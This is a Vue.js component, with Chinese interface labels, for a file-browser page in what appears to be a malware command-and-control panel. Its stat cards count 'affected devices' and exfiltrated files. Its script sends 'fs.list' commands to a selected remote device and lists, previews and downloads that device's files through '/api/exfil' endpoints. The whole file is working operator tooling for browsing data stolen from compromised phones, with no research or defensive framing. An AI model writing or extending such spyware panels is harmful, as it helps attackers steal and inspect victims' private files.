<template>
  <div class="file-browser">
    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><Document /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.by_category?.files || 0 }}</div>
              <div class="stat-label">文件总数</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #e6a23c;">
              <el-icon size="28"><Iphone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.devices || 0 }}</div>
              <div class="stat-label">受影响设备</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><FolderOpened /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ folderCount }}</div>
              <div class="stat-label">目录数量</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><Box /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ totalSize }}</div>
              <div class="stat-label">总大小</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <el-card>
      <div class="toolbar">
        <el-select v-model="selectedDevice" placeholder="选择设备" style="width: 250px;">
          <el-option v-for="device in devices" :key="device.device_uuid" :label="device.device_uuid" :value="device.device_uuid" />
        </el-select>
        <el-input v-model="currentPath" style="flex: 1; margin: 0 10px;" />
        <el-button @click="navigatePath(currentPath)">导航</el-button>
        <el-button @click="goBack" :disabled="pathHistory.length <= 1">返回</el-button>
      </div>
      
      <div class="path-bar">
        <el-breadcrumb separator="/">
          <el-breadcrumb-item v-for="(item, index) in pathParts" :key="index" @click="navigateTo(index)">
            {{ item || '根目录' }}
          </el-breadcrumb-item>
        </el-breadcrumb>
      </div>
      
      <div class="file-grid">
        <div 
          v-for="file in files" 
          :key="file.name" 
          class="file-item"
          @click="handleFileClick(file)"
        >
          <div class="file-icon">
            <el-icon v-if="file.type === 'directory'"><FolderOpened /></el-icon>
            <el-icon v-else-if="file.type === 'image'"><Picture /></el-icon>
            <el-icon v-else><Document /></el-icon>
          </div>
          <span class="file-name">{{ file.name }}</span>
        </div>
      </div>
      
      <el-dialog title="文件内容" v-model="fileDialogVisible" width="60%">
        <pre v-if="fileContent" style="white-space: pre-wrap; max-height: 500px; overflow-y: auto;">{{ fileContent }}</pre>
        <el-image v-else-if="currentFile?.type === 'image'" :src="getFileUrl(currentFile)" style="max-width: 100%;" />
        <div v-else>无法预览此文件类型</div>
      </el-dialog>
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive, computed, onMounted } from 'vue'
import axios from '../utils/axios'
import { FolderOpened, Picture, Document, Iphone, Box } from '@element-plus/icons-vue'

const devices = ref([])
const selectedDevice = ref('')
const currentPath = ref('/')
const files = ref([])
const pathHistory = ref(['/'])
const fileDialogVisible = ref(false)
const fileContent = ref('')
const currentFile = ref(null)
const stats = ref({})

const pathParts = computed(() => {
  return currentPath.value.split('/').filter(p => p)
})

const folderCount = computed(() => files.value.filter(f => f.type === 'directory').length)

const totalSize = computed(() => {
  const total = files.value.reduce((sum, f) => sum + (f.size || 0), 0)
  if (total < 1024) return total + ' B'
  if (total < 1024 * 1024) return (total / 1024).toFixed(2) + ' KB'
  return (total / 1024 / 1024).toFixed(2) + ' MB'
})

async function loadStats() {
  try {
    const response = await axios.get('/api/exfil/stats')
    stats.value = response.data
  } catch (error) {
    console.error('加载统计失败:', error)
  }
}

async function loadDevices() {
  try {
    const response = await axios.get('/api/devices?limit=100')
    devices.value = Array.isArray(response.data) ? response.data : (response.data.items || [])
  } catch (error) {
    console.error('加载设备失败:', error)
  }
}

async function navigatePath(path) {
  if (!selectedDevice.value) {
    alert('请先选择设备')
    return
  }
  try {
    const response = await axios.post(`/api/commands?device_uuid=${selectedDevice.value}`, {
      command: `fs.list ${path}`
    })
    await new Promise(resolve => setTimeout(resolve, 2000))
    await refreshFiles()
    pathHistory.value.push(path)
  } catch (error) {
    console.error('导航失败:', error)
  }
}

async function refreshFiles() {
  try {
    const response = await axios.get(`/api/devices/${selectedDevice.value}/exfil`)
    files.value = response.data.map(item => ({
      name: item.path.split('/').pop(),
      type: item.file_size > 0 ? 'file' : 'directory',
      size: item.file_size,
      path: item.path
    }))
  } catch (error) {
    console.error('刷新文件失败:', error)
  }
}

function navigateTo(index) {
  const path = '/' + pathParts.value.slice(0, index + 1).join('/')
  currentPath.value = path
}

function goBack() {
  if (pathHistory.value.length > 1) {
    pathHistory.value.pop()
    currentPath.value = pathHistory.value[pathHistory.value.length - 1]
  }
}

function handleFileClick(file) {
  if (file.type === 'directory') {
    currentPath.value = currentPath.value === '/' ? '/' + file.name : currentPath.value + '/' + file.name
    navigatePath(currentPath.value)
  } else {
    previewFile(file)
  }
}

function previewFile(file) {
  currentFile.value = file
  if (file.name.match(/\.(jpg|jpeg|png|gif|bmp)$/i)) {
    fileContent.value = ''
  } else {
    fileContent.value = '加载中...'
    axios.get(`/api/exfil/${file.id}/download`)
      .then(response => {
        fileContent.value = response.data || '无法读取文件内容'
      })
      .catch(() => {
        fileContent.value = '读取文件失败'
      })
  }
  fileDialogVisible.value = true
}

function getFileUrl(file) {
  return `/api/exfil/${file.id}/download`
}

onMounted(() => {
  loadStats()
  loadDevices()
})
</script>

<style scoped>
.stats-row {
  margin-bottom: 15px;
}

.stat-card {
  display: flex;
  align-items: center;
  gap: 15px;
}

.stat-icon {
  width: 60px;
  height: 60px;
  border-radius: 8px;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
}

.stat-info {
  flex: 1;
}

.stat-value {
  font-size: 24px;
  font-weight: bold;
  color: #333;
}

.stat-label {
  font-size: 14px;
  color: #999;
  margin-top: 5px;
}

.toolbar {
  display: flex;
  align-items: center;
  gap: 10px;
  margin-bottom: 15px;
}

.path-bar {
  margin-bottom: 15px;
}

.file-grid {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
  gap: 15px;
}

.file-item {
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 15px;
  background: #fff;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.2s;
}

.file-item:hover {
  background: #f5f7fa;
  transform: translateY(-2px);
}

.file-icon {
  font-size: 48px;
  color: #409eff;
  margin-bottom: 10px;
}

.file-name {
  font-size: 14px;
  text-align: center;
  overflow: hidden;
  text-overflow: ellipsis;
  white-space: nowrap;
  max-width: 100%;
}
</style>
